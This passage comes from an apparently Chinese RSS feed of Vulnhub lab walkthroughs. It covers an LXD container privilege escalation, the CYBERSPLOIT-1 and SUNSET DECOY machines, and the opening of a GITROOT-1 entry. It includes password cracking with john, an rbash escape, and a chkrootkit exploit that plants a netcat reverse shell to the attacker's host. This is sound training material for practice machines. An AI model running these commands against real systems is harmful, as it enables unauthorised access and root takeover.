+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-bash-5.0$ /snap/bin/lxc profile device add default root disk &lt;span style="color:#00688b">path&lt;/span>=/ &lt;span style="color:#00688b">pool&lt;/span>=pool
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-bash-5.0$ /snap/bin/lxc init trenchesofit ignite -c security.privileged=&lt;span style="color:#658b00">true&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-bash-5.0$ /snap/bin/lxc config device add ignite trenches disk &lt;span style="color:#00688b">source&lt;/span>=/ &lt;span style="color:#00688b">path&lt;/span>=/mnt/root &lt;span style="color:#00688b">recursive&lt;/span>=&lt;span style="color:#658b00">true&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-bash-5.0$ /snap/bin/lxc start ignite
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-bash-5.0$ /snap/bin/lxc &lt;span style="color:#658b00">exec&lt;/span> ignite /bin/sh
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/508/7.webp" alt="7">&lt;/p>- https://www.vulnhub.cn/walkthrough/508/ - This is a customized copyright.</description></item><item><title>Vulnhub 506 CYBERSPLOIT-1</title><link>https://www.vulnhub.cn/walkthrough/506/</link><pubDate>Thu, 09 Jul 2020 00:00:00 +0000</pubDate><guid>https://www.vulnhub.cn/walkthrough/506/</guid><description>Vulnhub靶机教程 https://www.vulnhub.cn/walkthrough/506/ -&lt;p>考点：base64&lt;/p>
+&lt;p>靶机链接：&lt;a href="https://www.vulnhub.com/entry/cybersploit-1,506/">https://www.vulnhub.com/entry/cybersploit-1,506/&lt;/a>&lt;/p>
+&lt;h2 id="环境配置">环境配置&lt;/h2>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>名称&lt;/th>
+&lt;th>IP&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>Kali Linux&lt;/td>
+&lt;td>10.0.2.24&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>CYBERSPLOIT-1&lt;/td>
+&lt;td>10.0.2.41&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;h2 id="初步打点">初步打点&lt;/h2>
+&lt;h3 id="端口扫描">端口扫描&lt;/h3>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ &lt;span style="color:#658b00">export&lt;/span> &lt;span style="color:#00688b">rip&lt;/span>=10.0.2.41
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sudo nmap -v -A -p- &lt;span style="color:#00688b">$rip&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ssh-hostkey:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#b452cd">1024&lt;/span> 01:1b:c8:fe:18:71:28:60:84:6a:9f:30:35:11:66:3d (DSA)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#b452cd">2048&lt;/span> d9:53:14:a3:7f:99:51:40:3f:49:ef:ef:7f:8b:35:de (RSA)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ &lt;span style="color:#b452cd">256&lt;/span> ef:43:5b:d0:c0:eb:ee:3e:76:61:5c:6d:ce:15:fe:7e (ECDSA)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http Apache httpd 2.2.22 ((Ubuntu))
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Hello Pentester!
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-methods:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Supported Methods: OPTIONS GET HEAD POST
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: Apache/2.2.22 (Ubuntu)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="web测试">WEB测试&lt;/h3>
+&lt;h5 id="dirsearch">dirsearch&lt;/h5>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ dirsearch -u http://10.0.2.41
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[11:37:34] &lt;span style="color:#b452cd">403&lt;/span> - 285B - /cgi-bin/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[11:37:39] &lt;span style="color:#b452cd">200&lt;/span> - 2KB - /index.html
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[11:37:39] &lt;span style="color:#b452cd">200&lt;/span> - 2KB - /index
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[11:37:46] &lt;span style="color:#b452cd">200&lt;/span> - 79B - /robots.txt
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[11:37:46] &lt;span style="color:#b452cd">403&lt;/span> - 290B - /server-status
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[11:37:46] &lt;span style="color:#b452cd">403&lt;/span> - 291B - /server-status/
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/506/1.webp" alt="1">&lt;/p>
+&lt;p>发现用户名&lt;code>itsskv&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/506/2.webp" alt="2">&lt;/p>
+&lt;p>发现字符串&lt;code>R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/506/3.webp" alt="3">&lt;/p>
+&lt;p>解密后&lt;/p>
+&lt;pre tabindex="0">&lt;code>Good Work !
+Flag1: cybersploit{youtube.com/c/cybersploit}
+&lt;/code>&lt;/pre>&lt;h2 id="获得权限">获得权限&lt;/h2>
+&lt;p>用户&lt;code>itsskv&lt;/code> 密码 &lt;code>cybersploit{youtube.com/c/cybersploit}&lt;/code>&lt;/p>
+&lt;p>登录成功&lt;/p>
+&lt;h2 id="提权">提权&lt;/h2>
+&lt;p>使用CVE-2021-4034 poc提权成功&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/506/4.webp" alt="4">&lt;/p>- https://www.vulnhub.cn/walkthrough/506/ - This is a customized copyright.</description></item><item><title>Vulnhub 505 SUNSET DECOY</title><link>https://www.vulnhub.cn/walkthrough/505/</link><pubDate>Tue, 07 Jul 2020 00:00:00 +0000</pubDate><guid>https://www.vulnhub.cn/walkthrough/505/</guid><description>Vulnhub靶机教程 https://www.vulnhub.cn/walkthrough/505/ -&lt;p>考点：暴力穷举,chkrootkit,rbash绕过&lt;/p>
+&lt;p>靶机链接：&lt;a href="https://www.vulnhub.com/entry/sunset-decoy,505/">https://www.vulnhub.com/entry/sunset-decoy,505/&lt;/a>&lt;/p>
+&lt;h2 id="环境配置">环境配置&lt;/h2>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>名称&lt;/th>
+&lt;th>IP&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>Kali Linux&lt;/td>
+&lt;td>10.0.2.15&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>SUNSET DECOY&lt;/td>
+&lt;td>10.0.2.13&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;h2 id="初步打点">初步打点&lt;/h2>
+&lt;h3 id="端口扫描">端口扫描&lt;/h3>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ &lt;span style="color:#658b00">export&lt;/span> &lt;span style="color:#00688b">rip&lt;/span>=10.0.2.13
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sudo nmap -v -A -p- &lt;span style="color:#00688b">$rip&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanning localhost (10.0.2.13) [&lt;span style="color:#b452cd">65535&lt;/span> ports]
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Discovered open port 80/tcp on 10.0.2.13
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Discovered open port 22/tcp on 10.0.2.13
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ssh-hostkey:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#b452cd">2048&lt;/span> a9:b5:3e:3b:e3:74:e4:ff:b6:d5:9f:f1:81:e7:a4:4f (RSA)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#b452cd">256&lt;/span> ce:f3:b3:e7:0e:90:e2:64:ac:8d:87:0f:15:88:aa:5f (ECDSA)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ &lt;span style="color:#b452cd">256&lt;/span> 66:a9:80:91:f3:d8:4b:0a:69:b0:00:22:9f:3c:4c:5a (ED25519)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http Apache httpd 2.4.38
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Index of /
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-ls: Volume /
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| SIZE TIME FILENAME
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| 3.0K 2020-07-07 16:36 save.zip
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="web测试">WEB测试&lt;/h3>
+&lt;p>查看80端口，下载save.zip&lt;/p>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ zip2john save.zip &amp;gt;&amp;gt;save.txt
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ john save.txt --wordlist /usr/share/wordlists/rockyou.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>得到zip压缩包密码&lt;code>manuel&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/505/1.webp" alt="1">&lt;/p>
+&lt;p>解压缩得到一些文件&lt;/p>
+&lt;h3 id="漏洞发现">漏洞发现&lt;/h3>
+&lt;p>尝试暴力破解系统密码&lt;/p>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ unshadow passwd shadow &amp;gt;pass.txt
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ john --wordlist=/usr/share/wordlists/rockyou.txt pass.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="获得权限">获得权限&lt;/h2>
+&lt;h3 id="靶机测试">靶机测试&lt;/h3>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/505/2.webp" alt="2">&lt;/p>
+&lt;p>成功获得一个用户的密码&lt;/p>
+&lt;p>现在登陆上去是rbash&lt;/p>
+&lt;p>使用参数获得bash&lt;/p>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ ssh 296640a3b825115a47b68fc44501c828@10.0.2.13 -t &lt;span style="color:#cd5555">&amp;#34;bash -noprofile&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="提权">提权&lt;/h2>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/505/3.webp" alt="3">&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/505/4.webp" alt="4">&lt;/p>
+&lt;h3 id="chkrootkit">chkrootkit&lt;/h3>
+&lt;p>发现chkrootkit，尝试已存在漏洞&lt;a href="https://www.exploit-db.com/exploits/33899">CVE-2014-0476&lt;/a>&lt;/p>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ &lt;span style="color:#658b00">cd&lt;/span> /tmp
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ &lt;span style="color:#658b00">echo&lt;/span> &lt;span style="color:#cd5555">&amp;#34;/usr/bin/nc 10.0.2.15 444 -e /bin/sh&amp;#34;&lt;/span> &amp;gt; update
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ bash update
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/505/5.webp" alt="5">&lt;/p>- https://www.vulnhub.cn/walkthrough/505/ - This is a customized copyright.</description></item><item><title>Vulnhub 488 GITROOT-1</title><link>https://www.vulnhub.cn/walkthrough/488/</link><pubDate>Fri, 03 Jul 2020 00:00:00 +0000</pubDate><guid>https://www.vulnhub.cn/walkthrough/488/</guid><description>Vulnhub靶机教程 https://www.vulnhub.cn/walkthrough/488/ -&lt;p>考点：githack,githook&lt;/p>
+&lt;p>靶机链接：&lt;a href="https://www.vulnhub.com/entry/gitroot-1,488/">https://www.vulnhub.com/entry/gitroot-1,488/&lt;/a>&lt;/p>
+&lt;h2 id="环境配置">环境配置&lt;/h2>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>名称&lt;/th>
+&lt;th>IP&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>Kali Linux&lt;/td>
+&lt;td>10.0.2.24&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>GITROOT-1&lt;/td>
+&lt;td>10.0.2.37&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;h2 id="初步打点">初步打点&lt;/h2>
+&lt;h3 id="端口扫描">端口扫描&lt;/h3>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ &lt;span style="color:#658b00">export&lt;/span> &lt;span style="color:#00688b">rip&lt;/span>=10.0.2.37
